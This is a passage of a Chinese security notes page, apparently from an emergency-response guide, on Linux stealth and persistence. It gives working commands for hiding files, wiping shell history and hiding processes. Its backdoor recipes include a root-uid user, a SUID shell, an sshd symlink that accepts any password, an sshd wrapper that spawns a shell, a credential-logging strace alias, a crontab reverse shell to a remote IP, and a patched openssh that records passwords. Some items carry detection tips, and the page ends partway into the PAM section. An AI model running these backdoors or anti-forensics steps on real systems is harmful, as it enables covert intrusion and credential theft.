+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chattr +i evil.php 锁定文件</span><br><span class="line">lsattr  evil.php   属性查看</span><br><span class="line">chattr -i evil.php 解除锁定</span><br><span class="line">rm -rf 1.evil.php  删除文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-2.png"></p>
+<p>不会吧。不会真有人挂科吧。</p>
+<p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-2.png"></p>
+<h3 id="0x04-隐藏历史操作命令"><a href="#0x04-隐藏历史操作命令" class="headerlink" title="0x04 隐藏历史操作命令"></a>0x04 隐藏历史操作命令</h3><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p>
+<p>技巧一：只针对你的工作关闭历史记录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[space]set +o history</span><br><span class="line">备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br></pre></td></tr></table></figure>
+
+<p>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p>
+<p>要重新开启历史功能，执行下面的命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Space]set -o history</span><br><span class="line">它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。</span><br></pre></td></tr></table></figure>
+
+<p>技巧二：从历史记录中删除指定的命令</p>
+<p>假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history | grep &quot;keyword&quot;</span><br></pre></td></tr></table></figure>
+
+<p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history -d [num]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-3.png"></p>
+<p>这种技巧是关键记录删除，或者我们可以暴力点，比如前150行是用户的正常操作记录，150以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前150行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;150,$d&#39; .bash_history</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05-隐藏远程SSH登陆记录"><a href="#0x05-隐藏远程SSH登陆记录" class="headerlink" title="0x05 隐藏远程SSH登陆记录"></a>0x05 隐藏远程SSH登陆记录</h3><p><strong>隐身登录系统，不会被w、who、last等指令检测到.</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@127.0.0.1 &#x2F;bin&#x2F;bash -i</span><br></pre></td></tr></table></figure>
+
+<p>不记录ssh公钥在本地.ssh目录中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null -T user@host &#x2F;bin&#x2F;bash –i</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x06-端口复用"><a href="#0x06-端口复用" class="headerlink" title="0x06 端口复用"></a>0x06 端口复用</h3><p>端口复用参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/78857088">https://zhuanlan.zhihu.com/p/78857088</a></p>
+<p>通过端口复用来达到隐藏端口的目的，在Linux下，如何实现端口复用呢？</p>
+<p>第一种方式：通过SSLH在同一端口上共享SSH与HTTPS</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#安装SSLH</span><br><span class="line"> sudo apt-get install sslh</span><br><span class="line"> #配置SSLH</span><br><span class="line"> 编辑 SSLH 配置文件：</span><br><span class="line"> sudo vi &#x2F;etc&#x2F;default&#x2F;sslh</span><br><span class="line"> 1、找到下列行：Run&#x3D;no  将其修改为：Run&#x3D;yes</span><br><span class="line"> 2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443</span><br><span class="line"> DAEMON_OPTS&#x3D;&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile &#x2F;var&#x2F;run&#x2F;sslh&#x2F;sslh.pid&quot;</span><br></pre></td></tr></table></figure>
+
+<p>第二种方式：利用IPTables进行端口复用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 端口复用链</span><br><span class="line">iptables -t nat -N LETMEIN</span><br><span class="line"># 端口复用规则</span><br><span class="line">iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22</span><br><span class="line"># 开启开关</span><br><span class="line">iptables -A INPUT -p tcp -m string --string &#39;threathuntercoming&#39; --algo bm -m recent --set --name letmein --rsource -j ACCEPT</span><br><span class="line"># 关闭开关</span><br><span class="line">iptables -A INPUT -p tcp -m string --string &#39;threathunterleaving&#39; --algo bm -m recent --name letmein --remove -j ACCEPT</span><br><span class="line"># let&#39;s do it</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</span><br></pre></td></tr></table></figure>
+
+<p>利用方式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#开启复用</span><br><span class="line">echo threathuntercoming | socat - tcp:192.168.28.128:80</span><br><span class="line">#ssh使用80端口进行登录</span><br><span class="line">ssh -p 80 root@192.168.28.128</span><br><span class="line">#关闭复用</span><br><span class="line">echo threathunterleaving | socat - tcp:192.168.28.128:80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-4.png"></p>
+<p>具体文章详见：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/137683.html">远程遥控 IPTables 进行端口复用</a></p>
+<h3 id="0x07-进程隐藏"><a href="#0x07-进程隐藏" class="headerlink" title="0x07 进程隐藏"></a>0x07 进程隐藏</h3><p>管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。</p>
+<p>第一种方法：libprocesshider</p>
+<p>github项目地址：<a target="_blank" rel="noopener" href="https://github.com/gianlucaborello/libprocesshider">https://github.com/gianlucaborello/libprocesshider</a></p>
+<p>利用 LD_PRELOAD 来实现系统函数的劫持，实现如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载程序编译</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;gianlucaborello&#x2F;libprocesshider.git</span><br><span class="line">cd libprocesshider&#x2F; &amp;&amp; make</span><br><span class="line"># 移动文件到&#x2F;usr&#x2F;local&#x2F;lib&#x2F;目录下</span><br><span class="line">cp libprocesshider.so &#x2F;usr&#x2F;local&#x2F;lib&#x2F;</span><br><span class="line"># 把它加载到全局动态连接局</span><br><span class="line">echo &#x2F;usr&#x2F;local&#x2F;lib&#x2F;libprocesshider.so &gt;&gt; &#x2F;etc&#x2F;ld.so.preload</span><br></pre></td></tr></table></figure>
+
+<p>测试：运行 evil_script.py，</p>
+<p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-5.png"></p>
+<p>如何在Linux中发现隐藏的进程，</p>
+<p><code>unhide</code> 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。这个工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="http://www.unhide-forensics.info/">http://www.unhide-forensics.info/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">sudo yum install unhide</span><br><span class="line"># 使用</span><br><span class="line">unhide [options] test_list</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>unhide proc</code>发现隐藏进程evil_script.py，如下图所示：</p>
+<p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-7.png"></p>
+<p>第二种方法：进程注入工具linux-inject</p>
+<p>linux-inject是用于将共享对象注入Linux进程的工具</p>
+<p>github项目地址： <a target="_blank" rel="noopener" href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载程序编译</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;gaffe23&#x2F;linux-inject.git</span><br><span class="line">cd linux-inject &amp;&amp; make</span><br><span class="line"># 测试进程</span><br><span class="line">.&#x2F;sample-target</span><br><span class="line"># 进程注入</span><br><span class="line">.&#x2F;inject -n sample-target sample-library.so</span><br></pre></td></tr></table></figure>
+
+<p>验证进程注入成功，如下图所示：</p>
+<p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-8.png"></p>
+<p>Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/">https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 下载解压</span><br><span class="line">wget https:&#x2F;&#x2F;jaist.dl.sourceforge.net&#x2F;project&#x2F;cymothoa&#x2F;cymothoa-1-beta&#x2F;cymothoa-1-beta.tar.gz</span><br><span class="line">tar zxvf cymothoa-1-beta.tar.gz </span><br><span class="line"># </span><br><span class="line">cd cymothoa-1-beta &amp;&amp; make</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x07-结语"><a href="#0x07-结语" class="headerlink" title="0x07 结语"></a>0x07 结语</h3><p>本文主要介绍了Linux下的几种隐藏技术，包括隐藏文件、隐藏权限、隐藏历史操作命令、端口复用、进程隐藏等方面的技巧。仅作抛砖引玉之用，欢迎留言分享。</p>
+<p>参考文章：</p>
+<p>Tiny Shell</p>
+<p>这款工具通过在源码中设置PROCESS_NAME为bash，以使得其运行后的进程名显示为bash。 在恶意代码中通过设置具有迷惑性的进程名字，以达到躲避管理员检查的目的。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/orangetw/tsh">https://github.com/orangetw/tsh</a></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/138350.html">https://www.freebuf.com/sectool/138350.html</a></p>
+<p>mount-bind</p>
+<p>利用mount —bind 将另外一个目录挂载覆盖至/proc/目录下指定进程ID的目录</p>
+<p>聊一聊Linux下进程隐藏的常见手法及侦测手段 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/160843">https://www.anquanke.com/post/id/160843</a></p>
+<p>反入侵之发现后门利用mount-bind将进程和端口信息隐匿 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/140535.html">https://www.freebuf.com/articles/network/140535.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/liuqz2009/article/details/43530201">https://blog.csdn.net/liuqz2009/article/details/43530201</a> Linux 共享库注入后门</p>
+<p>linux 进程注入后门工具Cymothoa</p>
+<p>如何隐藏你的 Linux 的命令行历史 <a target="_blank" rel="noopener" href="https://www.linuxprobe.com/hidden-cmd-history.html">https://www.linuxprobe.com/hidden-cmd-history.html</a></p>
+<p>利用sslh实现端口复用 <a target="_blank" rel="noopener" href="https://www.bbsmax.com/A/QW5YwpWezm/">https://www.bbsmax.com/A/QW5YwpWezm/</a></p>
+<p>远程遥控 IPTables 进行端口复用 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/137683.html">https://www.freebuf.com/articles/network/137683.html</a></p>
+<p>Venom 多级代理工具</p>
+<p>linux 下隐藏进程的一种方法及遇到的坑</p>
+<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/147024.htm">https://www.jb51.net/article/147024.htm</a></p>
+<p>如何在 Linux/Unix/Windows 中发现隐藏的进程和端口 <a target="_blank" rel="noopener" href="https://linux.cn/article-9288-1.html">https://linux.cn/article-9288-1.html</a></p>
+<h2 id="后门篇"><a href="#后门篇" class="headerlink" title="后门篇"></a>后门篇</h2><p>本文将对Linux下常见的权限维持技术进行解析，知己知彼百战不殆。</p>
+<p><strong>1、一句话添加用户和密码</strong></p>
+<p>添加普通用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的普通用户</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest</span><br><span class="line"></span><br><span class="line"># useradd -p 方法  &#96; &#96; 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"></span><br><span class="line"># chpasswd方法</span><br><span class="line">useradd guest;echo &#39;guest:123456&#39;|chpasswd</span><br><span class="line"></span><br><span class="line"># echo -e方法</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure>
+
+<p>添加root用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的root用户</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest -o -u 0 -g root -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;test</span><br></pre></td></tr></table></figure>
+
+<p>可疑用户排查技巧：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br><span class="line"># 查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#39;&#x2F;\$1|\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br><span class="line"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、SUID Shell</strong></p>
+<p>Suid shell是一种可用于以拥有者权限运行的shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">配合普通用户权限使用</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shell</span><br><span class="line">chmod u+s &#x2F;tmp&#x2F;shell</span><br></pre></td></tr></table></figure>
+
+<p>使用guest用户登录就可疑获取root权限。</p>
+<p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-1.png"></p>
+<p>备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。</p>
+<p>排查技巧：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 在Linux中查找SUID设置的文件</span><br><span class="line">find . -perm &#x2F;4000 </span><br><span class="line"># 在Linux中查找使用SGID设置的文件</span><br><span class="line">find . -perm &#x2F;2000</span><br><span class="line"># 取消s权限</span><br><span class="line">chmod u-s &#x2F;tmp&#x2F;shell</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、ssh公私钥免密登录</strong></p>
+<p>在客户端上生成一对公私钥，然后把公钥放到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。</p>
+<p>客户端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-2.png"></p>
+<p>进入/root/.ssh/文件夹，查看文件夹的内容，如下所示：</p>
+<p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-3.png"></p>
+<p>其中 <code>id_rsa</code>为私钥，<code>id_rsa.pub</code>为公钥，接下来打开<code>id_rsa.pub</code>，将内容复制到服务器。将<code>id_rsa.pub</code>的内容追加到<code>/root/.ssh/authorized_keys</code>内，配置完成。</p>
+<p>排查技巧：查看<code>/root/.ssh/authorized_keys</code>是否被修改。</p>
+<p><strong>4、软连接</strong></p>
+<p>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 <code>/tmp/su</code> 在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。</p>
+<p>在目标服务器上执行一句话后门：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;8888</span><br></pre></td></tr></table></figure>
+
+<p>执行完之后，任何一台机器<code>ssh root@IP -p 8888</code>，输入任意密码，成功登录。</p>
+<p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-4.png"></p>
+<p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p>
+<p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-4-1.png"></p>
+<p><strong>5、SSH wrapper</strong></p>
+<p>首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p>
+<p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p>
+<p>服务端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">mv sshd ..&#x2F;bin&#x2F;</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br></pre></td></tr></table></figure>
+
+<p>客户端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:target_ip:22,sourceport&#x3D;13377</span><br><span class="line"></span><br><span class="line">#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。</span><br><span class="line">&gt;&gt;&gt; import struct</span><br><span class="line">&gt;&gt;&gt; buffer &#x3D; struct.pack(&#39;&gt;I6&#39;,19526)</span><br><span class="line">&gt;&gt;&gt; print repr(buffer)</span><br><span class="line">&#39;\x00\x00LF&#39;</span><br><span class="line">&gt;&gt;&gt; buffer &#x3D; struct.pack(&#39;&gt;I6&#39;,13377)</span><br><span class="line">&gt;&gt;&gt; print buffer</span><br><span class="line">4A</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-5.png"></p>
+<p>排查技巧：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ls -al &#x2F;usr&#x2F;sbin&#x2F;sshd</span><br><span class="line"># cat &#x2F;usr&#x2F;sbin&#x2F;sshd</span><br><span class="line">可通过重装ssh服务恢复。</span><br></pre></td></tr></table></figure>
+
+<p><strong>6、strace后门</strong></p>
+<p>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#vim &#x2F;etc&#x2F;bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source &#x2F;root&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
+
+<p><strong>7、crontab反弹shell</strong></p>
+<p>crontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。</p>
+<p>a、创建shell脚本，例如在/etc/evil.sh</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.28.131&#x2F;12345  0&gt;&amp;1</span><br><span class="line">chmod +sx &#x2F;etc&#x2F;evil.sh</span><br></pre></td></tr></table></figure>
+
+<p>b、crontab -e 设置定时任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#每一分钟执行一次</span><br><span class="line">*&#x2F;1 * * * * root &#x2F;etc&#x2F;evil.sh</span><br></pre></td></tr></table></figure>
+
+<p><strong>8、openssh后门</strong></p>
+<p>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">a、备份SSH配置文件</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old</span><br><span class="line"></span><br><span class="line">b、解压并安装补丁</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch&#x2F;sshbd5.9p1.diff  &#x2F;openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br><span class="line"></span><br><span class="line">c、记录用户名和密码的文件位置及其密码</span><br><span class="line">vi  includes.h</span><br><span class="line">    #define ILOG &quot;&#x2F;tmp&#x2F;1.txt&quot;             &#x2F;&#x2F;记录登录本机的用户名和密码</span><br><span class="line">    #define OLOG &quot;&#x2F;tmp&#x2F;2.txt&quot;             &#x2F;&#x2F;记录本机登录远程的用户名和密码</span><br><span class="line">    #define SECRETPW &quot;123456789&quot;          &#x2F;&#x2F;后门的密码</span><br><span class="line"></span><br><span class="line">d、修改版本信息</span><br><span class="line">vi version.h</span><br><span class="line">    #define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;</span><br><span class="line">    #define SSH_PORTABLE &quot;小版本号&quot;</span><br><span class="line"></span><br><span class="line">e、安装并编译</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc&#x2F;ssh --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">f、对比原来的配置文件，使配置文件一致，然后修改文件日期。</span><br><span class="line"></span><br><span class="line">touch -r  &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old &#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">touch -r  &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line">g、清除操作记录</span><br><span class="line">export HISTFILE&#x3D;&#x2F;dev&#x2F;null</span><br><span class="line">export HISTSIZE&#x3D;0</span><br><span class="line">echo &gt;&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;清空操作日志</span><br></pre></td></tr></table></figure>
+
+<p>排查技巧：利用strace找出ssh后门.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 1、获取可疑进程PI</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2、跟踪sshd PID</span><br><span class="line">strace -o aa -ff -p  PID</span><br><span class="line"># 3、查看记录密码打开文件</span><br><span class="line">grep open sshd* | grep -v -e No -e  null -e denied| grep  WR</span><br></pre></td></tr></table></figure>
+
+<p><strong>9、PAM后门</strong></p>
+<p>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。</p>
+<p>利用方法:</p>
